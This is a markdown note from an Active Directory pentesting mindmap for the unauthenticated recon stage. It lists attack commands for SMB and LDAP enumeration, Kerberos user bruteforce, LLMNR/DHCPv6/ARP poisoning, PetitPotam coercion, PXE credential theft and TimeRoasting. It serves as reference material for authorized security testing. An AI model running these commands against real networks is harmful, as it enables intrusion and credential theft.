---
title: "No Credentials"
category: recon
color: "#D0CEE2"
tags:
  - ad-mindmap
  - recon
  - cve
---

# 🔍 No Credentials

> [!info] Mindmap box `No Credentials`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Scan network
➡️ [[Quick Compromise|Vulnerable host]]

- `nxc smb <ip_range>` [↗](https://github.com/Pennyw0rth/NetExec)
- `nmap -sP -p <ip>` [↗](https://github.com/nmap/nmap)
- `nmap -Pn -sV --top-ports 50 --open <ip>` [↗](https://github.com/nmap/nmap)
- `nmap -Pn --script smb-vuln* -p139,445 <ip>` [↗](https://github.com/nmap/nmap)
- `nmap -Pn -sC -sV -oA <output> <ip>` [↗](https://github.com/nmap/nmap)
- `nmap -Pn -sC -sV -p- -oA <output> <ip>` [↗](https://github.com/nmap/nmap)
- `nmap -sU -sC -sV -oA <output> <ip>` [↗](https://github.com/nmap/nmap)

## Find DC IP

- `nmcli dev show <interface>` [↗](https://linux.die.net/man/1/nmcli)
- `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>` [↗](https://linux.die.net/man/1/nslookup)
- `nmap -p 88 --open <ip_range>` [↗](https://github.com/nmap/nmap)

## Zone transfer

- `dig axfr <domain_name> @<name_server>` [↗](https://linux.die.net/man/1/dig)

## Anonymous & Guest access on SMB shares

- `nxc smb <ip_range> -u '' -p ''` [↗](https://github.com/Pennyw0rth/NetExec)
- `nxc smb <ip_range> -u 'a' -p ''` [↗](https://github.com/Pennyw0rth/NetExec)
- `enum4linux-ng.py -a -u '' -p '' <ip>` [↗](https://github.com/cddmp/enum4linux-ng)
- `smbclient -U '%' -L //<ip>` [↗](https://linux.die.net/man/1/smbclient)

## Enumerate LDAP
➡️ [[Valid User (No Password)|Username]]

- `nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>` [↗](https://github.com/nmap/nmap)
- `ldapsearch -x -H <dc_ip> -s base` [↗](https://linux.die.net/man/1/ldapsearch)

## Enumerate Users
➡️ [[Valid User (No Password)|Username]]

- `nxc smb <dc_ip> --users` [↗](https://github.com/Pennyw0rth/NetExec)
- `nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID` [↗](https://github.com/Pennyw0rth/NetExec)
- `net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'`

## Bruteforce users
➡️ [[Valid User (No Password)|Username]]

- `kerbrute userenum -d <domain> <userlist>` [↗](https://github.com/ropnop/kerbrute)
- `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm= '<domain>',userdb=<user_list_file>" <dc_ip>` [↗](https://github.com/nmap/nmap)

## Poisoning
➡️ [[Man In The Middle|poisoning SMB]] / [[Man In The Middle|poisoning LDAP]] / [[Man In The Middle|poisoning HTTP]]

- LLMNR / NBTNS / MDNS
    - `responder -l <interface>` [↗](https://github.com/lgandx/Responder)
- ⚠️ DHCPv6 (IPv6 prefered to IPv4)
    - `mitm6 -d <domain>` [↗](https://github.com/dirkjanm/mitm6)
    - `bettercap` [↗](https://www.bettercap.org/)
- ⚠️ ARP Poisoning
    - `bettercap` [↗](https://www.bettercap.org/)
    - `asreqroast`
        - `Pcredz -i <interface> -v` [↗](https://github.com/lgandx/PCredz) ➡️ [[Crack Hash|Hash found ASREQ]]

## Coerce
➡️ [[Man In The Middle|Coerce SMB]]

- Unauthenticated PetitPotam (CVE-2022-26925) `#CVE`
    - `petitpotam.py -d <domain> <listener> <target>` [↗](https://github.com/topotam/PetitPotam)

## PXE

- no password ➡️ [[Valid Credentials|Credentials (NAA account)]]
    - `pxethief.py 1` [↗](https://github.com/MWR-CyberSec/PXEThief)
    - `pxethief.py 2 <distribution_point_ip>` [↗](https://github.com/MWR-CyberSec/PXEThief)
- password protected ➡️ [[Crack Hash|PXE Hash]]
    - `tftp -i <dp_ip> GET "\xxx\boot.var"` [↗](https://linux.die.net/man/1/tftp)
    - `pxethief.py 5 '\xxx\boot.var'` [↗](https://github.com/MWR-CyberSec/PXEThief)

## TimeRoasting
➡️ [[Crack Hash|timeroast hash]]

- `timeroast.py <dc_ip> -o <output_log>` [↗](https://github.com/SecuraBV/Timeroast)
